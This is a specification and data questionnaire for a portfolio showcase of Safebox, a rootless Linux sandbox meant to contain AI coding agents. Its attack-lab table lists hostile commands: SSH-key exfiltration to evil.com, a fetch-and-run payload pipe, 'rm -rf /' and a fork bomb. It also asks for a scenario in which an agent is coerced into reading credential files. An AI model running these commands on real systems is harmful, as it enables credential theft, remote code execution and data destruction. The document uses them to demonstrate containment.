# Safebox Portfolio Integration: Master Technical Intake Specification

This document is the authoritative specification and data intake questionnaire for the engineer or AI agent working on the **Safebox** project. It details the portfolio architecture, design system, sandbox patterns, and exact data structures required to showcase Safebox on **[mahboob.engineer](https://mahboob.engineer)**.

---

## 1. Executive Summary & Deliverable Scope

Safebox will be integrated into the portfolio across three primary surfaces:
1. **Homepage Featured Section (`Everything I've built end-to-end`)**: Positioned as **Block 1 of 4** (ahead of Algocode, Movio, and DrishtiAI).
2. **Dedicated Case Study (`/work/safebox`)**: Complete architecture breakdown, metrics, 5-stage build narrative, and categorized stack mapping.
3. **Interactive Sandbox Engine on `/work/safebox`**:
   - **Part 1: Architectural Pipeline Explorer**: 5-stage interactive breakdown (User Namespaces, OverlayFS, Landlock LSM, Userspace NAT, PID 1 Supervisor).
   - **Part 2: Master Simulation Arena**:
     - **Antigravity CLI (`agy`) Simulator**: Authentic ASCII logo, startup sequence, interactive prompt execution, and live Safebox change management commands (`diff`, `cat`, `apply`, `revert`).
     - **Chrome DevTools Network Waterfall Showcase**: Visual waterfall of every Linux kernel and supervisor step Safebox executes before child handoff, complete with microsecond timing and syscall inspector drawers.
     - **Boundary Attack Lab**: Side-by-side comparison of malicious workloads (credential theft, destructive deletion, malicious egress) running on Bare Host vs inside Safebox.

---

## 2. Portfolio Tech Stack & Color Profile

All simulation components and content must integrate seamlessly with the portfolio design system.

### Tech Stack
- **Framework**: Next.js 16 (App Router, React Server Components with isolated `'use client'` interactive boundaries)
- **UI & State**: React 19, TypeScript (strict mode), Framer Motion
- **Styling**: Tailwind CSS v4 with CSS variable theme bridge

### Color Profile & Tokens
The portfolio uses a dark, high-contrast forest aesthetic. Never propose colors outside these tokens:

| Token | Variable | Hex | Role / Semantic Usage |
| :--- | :--- | :--- | :--- |
| **Background** | `--bg` | `#172318` | Global page background |
| **Surface** | `--surface` | `#1C2E1E` | Card backgrounds, section panels |
| **Card / Elev** | `--card` / `--elev` | `#223626` / `#2A4030` | Elevated containers, drawers, modals |
| **Active** | `--active` | `#1E3828` | Selected tab states, active buttons |
| **Border Subtle** | `--border` | `#334E3C` | Default structural borders |
| **Border Strong** | `--border-strong` | `#406050` | Highlighted borders, focused inputs |
| **Text Tier 1** | `--t1` | `#D8EEE2` | Primary headings, terminal commands |
| **Text Tier 2** | `--t2` | `#9AC0A0` | Readable body copy, descriptions |
| **Text Tier 3** | `--t3` | `#60908F` | Muted labels, timestamps, line numbers |
| **Accent Mint** | `--acc` | `#5CC9A0` | Primary brand accent, focus rings |
| **Accent Dim** | `--acc-dim` | `#1E3828` | Accent glows and button washes |
| **Amber** | `--amber` | `#F59E0B` | Status indicators, metrics, warnings |
| **Amber Dim** | `--amber-dim` | `#2A1F06` | Amber tag backgrounds |
| **Code / Terminal** | `--code-bg` | `#0D1511` | Terminal viewports, code editors |

### Typography
- **Display**: `'Space Grotesk', sans-serif` (section titles, card headings)
- **Body**: `'Inter', sans-serif` (body copy, narrative text)
- **Mono**: `'JetBrains Mono', monospace` (code, metrics, timing badges, terminal)

---

## 3. Mandatory Writing & Style Guidelines

Every piece of text, bullet point, description, and terminal message must adhere to these strict rules:

1. **Zero Em Dashes**: Never use em dashes (`—`) or double hyphens (`--`) as punctuation. Use colons, parentheses, commas, or split into two sentences.
2. **Zero Emojis**: Never use emojis (no 🚀, 🛡️, ⚡, 📦). Use pure text, ASCII symbols (`>`, `*`, `[+]`), or SVGs.
3. **Zero AI Fingerprints & Buzzwords**: Do not use "seamless", "testament", "delve", "pivotal", "elevate", "cutting-edge", "game-changer", "robust", "leverage", "utilize", "empower", "beacon", "landscape", or "journey".
4. **Active, Punchy Verbs without `-ing` Fluff**: Avoid weak gerund-heavy phrasing.
   - *Bad*: "Providing fast sandboxing and securing processes by isolating mounts."
   - *Good*: "Enforces kernel filesystem boundaries, isolates process trees, and traps mutations in ephemeral memory."
5. **Direct & Mechanical Tone**: State facts, numbers, syscalls, and exact outcomes. Write like a systems engineer documenting a production kernel subsystem.

---

## 4. How Sandboxes Work on mahboob.engineer

To understand the target implementation, observe how existing sandboxes are structured in the codebase:

### Pattern 1: Dedicated Data Dictionary (`*-simulation-data.ts`)
Components never hardcode state. All scenario data, terminal transcripts, diffs, and trees live in a separate dictionary file (e.g. `unthink-simulation-data.ts`, `taply-simulation-data.ts`).
- Fully typed with TypeScript interfaces.
- Zero network dependencies: runs entirely client-side with deterministic transitions.

### Pattern 2: Two-Tier Section Layout on `/work/[slug]`
Case study pages host two distinct interactive components inside `BuildNotes`:
1. **Interactive Pipeline Explorer** (e.g. `<UnthinkInteractiveExplorer />`):
   - A 5-tab horizontal bar (`step`, `badge`, `label`, `tag`).
   - Clicking a tab reveals an interactive stage illustrating a single architectural subsystem (e.g. DOM Stripper with Raw HTML vs Clean Markdown toggle, or Redis Epoch Invalidation).
2. **Master Simulation Arena** (e.g. `<UnThinkSimulation />`, `<TaplySimulation />`):
   - Full product sandbox with persona/scenario switches.
   - Live interactive actions: terminal prompt, command dispatch, diff inspection, and real-time inspector modals.

### Pattern 3: SVG Architecture Diagrams (`components/diagrams/`)
- Responsive inline SVG (`viewBox="0 0 980 440"`).
- Animated packet lines using CSS stroke-dashoffset.
- Dark theme colors matched to `colors.surface`, `colors.border`, `colors.acc`, and `colors.amber`.

---

## 5. Detailed Content & Data Intake Questionnaire

Please provide the exact data requested in each section below.

---

### Part A: Homepage Featured Card (`Everything I've built end-to-end`)

This card is the first item visitors see in the featured systems section on the homepage.

1. **Status Eyebrow**: Short mono label (e.g. `systems programming · linux kernel isolation · go`).
2. **Project Name**: `Safebox`
3. **Tagline**: Direct one-line description without em dashes (e.g. `Unprivileged microsecond Linux sandbox and change management engine for autonomous AI coding agents.`).
4. **Problem Paragraph** (max 2-3 sentences): Why bare-host agent execution is dangerous (accidental `rm -rf`, credential exfiltration from `~/.ssh`, dependency pollution).
5. **Approach / Built Paragraph** (max 2-3 sentences): How Safebox solves this with unprivileged user namespaces, Landlock LSM, and ephemeral OverlayFS.
6. **Headline Metrics** (4 items):
   - Metric 1 (e.g. `<30ms Startup Latency`)
   - Metric 2 (e.g. `0 Root Privileges`)
   - Metric 3 (e.g. `100% LSM Kernel Isolation`)
   - Metric 4 (e.g. `Zero-Footprint Diff Capture`)
7. **Stack Chips** (6-10 technologies): e.g. `["Go 1.24", "Linux Namespaces", "Landlock LSM", "OverlayFS", "slirp4netns", "cgroups", "seccomp"]`.

---

### Part B: `/work/safebox` Case Study Narrative & Deep Build Notes

Provide the long-form engineering breakdown for the case study page:

1. **Hero Problem Statement**: Detailed description of the autonomous coding agent containment problem.
2. **Hero Built Summary**: Architectural summary of the five-layer defense model.
3. **The 5-Stage Build Story** (3-4 paragraphs each, written in first person, direct and conversational without AI buzzwords):
   - **Stage 1: Genesis & Threat Model**: Why Docker and VMs fail for local AI agents (heavy startup latency, root daemon security risks, host file permission mismatches).
   - **Stage 2: Kernel Primitives & Rootless Namespaces**: Implementing `CLONE_NEWUSER`, UID/GID mapping, isolated mount table (`CLONE_NEWNS`), PID isolation, and signal forwarding.
   - **Stage 3: Ephemeral OverlayFS & Change Lifecycle**: Trapping mutations in `upperdir` and `workdir`, whiteout device mechanics for deleted files, atomic commit via temporary staging, and zero-trace rollback.
   - **Stage 4: Userspace Networking & Boundary Containment**: Network namespace isolation (`CLONE_NEWNET`), pasta vs slirp4netns fallback, virtual DNS proxy (`10.0.2.3`), and host loopback blocking.
   - **Stage 5: Production Verification, Benchmarks & Future Horizon**: Real-world benchmarks (<30ms startup), kernel Landlock ABI checks, and roadmap items (cgroup v2 memory limits, eBPF telemetry).
4. **Categorized Stack Breakdown**:
   - **Systems & Kernel**: Linux Namespaces, Landlock LSM, OverlayFS, cgroups v2
   - **Runtime & Architecture**: Go 1.24, POSIX Signals, Fork/Exec Supervisor, PID 1 Init Shim
   - **Networking & Security**: slirp4netns, pasta, Synthetic Bind Mounts, Rootless UID Mapping
   - **CLI & Change Control**: Unified Diff Engine, TOML Profiles, Atomic Commit Pipeline

---

### Part C: Antigravity CLI (`agy`) Simulation Engine Data

The sandbox must provide a realistic simulation of running the Antigravity CLI (`agy`) inside Safebox.

1. **Official `agy` ASCII Banner & Startup Telemetry**:
   - Exact ASCII text logo or banner text printed when `agy` starts.
   - Startup metadata lines (e.g. version, active model, workspace root, detected tool capabilities).
2. **Interactive Prompt Scenarios (Provide 3 to 4 distinct scenarios)**:
   For each scenario, provide:
   - **Scenario Title & Description** (e.g. `Scenario 1: Add Healthcheck Endpoint`).
   - **User Input Prompt** (e.g. `agy -p "implement GET /health endpoint with 200 OK"`).
   - **Agent Execution Steps & Log Output**:
     - Internal thoughts / planning steps.
     - Tool invocations (e.g. `view_file main.go`, `write_to_file healthcheck.go`).
     - Terminal output returned to the user.
   - **Staged File Changes in Upperdir**:
     - List of affected files (`healthcheck.go` ADDED, `main.go` MODIFIED).
     - Full unified git-style diff output (`safebox diff -p`).
     - Raw file contents for `safebox cat <path>`.
3. **Attack / Boundary Violation Scenario**:
   - Prompt where agent attempts or is coerced to read `~/.ssh/id_rsa` or `/etc/shadow`.
   - Realistic Safebox Landlock LSM block message (`EACCES: Permission denied`).
   - Realistic network exfiltration failure (`Network is unreachable`).
   - Agent summary reporting the security barrier encountered.
4. **Safebox Change Control Terminal Outputs**:
   Provide the exact terminal stdout/stderr for:
   - `safebox diff` (tabular change list).
   - `safebox diff -p` (unified diff with line numbers).
   - `safebox cat <file>` (cat output from upperdir).
   - `safebox apply --yes` (atomic commit progress and completion message).
   - `safebox revert --yes` (session cleanup and teardown confirmation).

---

### Part D: Chrome DevTools Network Waterfall Showcase Data

Safebox prints microsecond-latency timing traces before running the child command. We are presenting this as a Chrome DevTools Network Waterfall view.

Provide the exact benchmarked timing and technical metadata for all 11 lifecycle phases:

```text
[safebox] profile resolution           ok  14.22µs
[safebox] session initialize           ok  26.812901ms
[safebox] wrapped command spawn        ok  2.812401ms
[safebox] egress setup                 ok  slirp4netns
[safebox:child] netpolicy apply              ok  280.112µs
[safebox:child] procfs mount                 ok  52.181µs
[safebox:child] overlayfs mount              ok  380.412µs
[safebox:child] persistent state mount       ok  65.119µs
[safebox:child] shadow /etc mounts           ok  41.302µs
[safebox:child] landlock restrict            ok  7.112091ms
[safebox:child] exec handoff                 ok  620.182µs
```

For each of the 11 phases, provide:
1. **Phase Name**: Exact badge and step name.
2. **Execution Context**: Supervisor (Parent) vs Shim (Child PID 1).
3. **Typical Duration**: Precise value (e.g. `14.22µs`, `26.81ms`).
4. **Status**: `ok` / HTTP `200` equivalent.
5. **Deep-Dive Syscall & Kernel Details** (revealed when a user clicks the waterfall row):
   - Exact Linux Syscalls invoked (`clone3`, `mount`, `landlock_restrict_self`, etc.).
   - Exact flags and parameters (e.g. `MS_NOSUID | MS_NODEV | MS_NOEXEC`).
   - Security invariant enforced.
   - Failure behavior (fail loud fatal error vs safe fallback).

---

### Part E: Untrusted Code & Boundary Attack Lab Data

Provide the exact simulation data for comparing Bare Host execution against Safebox execution across 4 distinct attack vectors:

| Attack Vector | Tested Command | Bare Host Result (Vulnerable) | Safebox Result (Contained) | Enforcing Layer |
| :--- | :--- | :--- | :--- | :--- |
| **Credential Theft** | `cat ~/.ssh/id_rsa \| curl -X POST https://evil.com` | Exfiltrates private keys over internet | Blocked with `EACCES`; network unreachable | Landlock LSM + Loopback NetNS |
| **Destructive Deletion** | `rm -rf *` or `rm -rf /` | Destroys host workspace or OS files | Trapped in ephemeral upperdir; discarded via `revert` | Ephemeral OverlayFS |
| **Malicious Egress** | `curl -fsSL https://evil.com/payload.sh \| bash` | Downloads and executes untrusted payload | Connection fails immediately; zero egress | Userspace NAT (Default Deny) |
| **Fork Bomb / Zombie Clutter**| `:(){ :\|:& };:` | Exhausts host PID table; locks system | Contained in private PID table; reaped by PID 1 | `CLONE_NEWPID` + Init Shim |

For each vector, provide:
1. Exact CLI input command.
2. Simulated Bare Host terminal stream (showing the disaster).
3. Simulated Safebox terminal stream (showing the timing trace, graceful interception, and exact error message).
4. Technical breakdown of why the attack failed inside Safebox.

---

## 6. TypeScript Data Contract Template

To accelerate integration, the Safebox agent can return the data formatted directly to match this TypeScript contract:

```typescript
// Target structure for components/work/safebox-simulation-data.ts

export interface WaterfallStep {
  id: string;
  name: string;
  phase: "supervisor" | "child";
  durationLabel: string;
  durationMicros: number;
  status: "ok" | "blocked";
  syscall: string;
  flags: string;
  description: string;
  securityInvariant: string;
}

export interface AgyScenario {
  id: string;
  title: string;
  category: "feature" | "security" | "refactor";
  prompt: string;
  timingBreakdown: WaterfallStep[];
  agyLogStream: Array<{
    type: "banner" | "thought" | "tool_call" | "output" | "error";
    text: string;
  }>;
  diffSummary: Array<{
    path: string;
    status: "ADDED" | "MODIFIED" | "DELETED";
    insertions: number;
    deletions: number;
  }>;
  patchDiff: string;
  fileContents: Record<string, string>;
}

export interface AttackVector {
  id: string;
  title: string;
  command: string;
  category: "credential" | "filesystem" | "network" | "process";
  bareHost: {
    terminalOutput: string;
    outcome: string;
    severity: "CRITICAL" | "HIGH";
  };
  safebox: {
    terminalOutput: string;
    outcome: string;
    enforcingPrimitive: string;
  };
  technicalRemediation: string;
}

export interface PipelineStage {
  id: string;
  stepNumber: string;
  label: string;
  badge: string;
  tag: string;
  headline: string;
  codeSnippet: string;
  metrics: Array<{ label: string; value: string }>;
  explanation: string;
}
```

---

## 7. Submission Checklist for the Safebox Agent

Before providing the response, please verify:
- [ ] No em dashes (`—`) anywhere in text or code comments.
- [ ] No emojis in text, titles, logs, or metrics.
- [ ] No AI buzzwords ("seamless", "testament", "pivotal", "elevate", "robust").
- [ ] Direct, mechanical, professional tone without `-ing` ending sentence structures.
- [ ] Accurate Go 1.24 and Linux kernel primitives (Landlock LSM, OverlayFS, namespaces, slirp4netns).
- [ ] Complete diffs, terminal outputs, and microsecond waterfall timings.
